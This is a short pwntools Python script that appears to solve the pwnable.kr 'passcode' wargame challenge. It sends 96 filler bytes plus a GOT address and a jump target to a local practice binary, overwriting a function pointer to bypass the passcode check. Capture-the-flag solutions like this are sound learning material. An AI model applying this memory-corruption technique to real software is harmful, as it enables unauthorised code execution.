from pwn import *

context.update(arch="i386", os="linux")
e = ELF("./pwnable.kr_passcode.assets/passcode")

name = b"A" * 96
name += p32(0x804a004)
name += str.encode(str(0x080485d7))

p = e.process(level="error")
# header
print(p.recvline())
p.sendline(name)
print(p.recvall())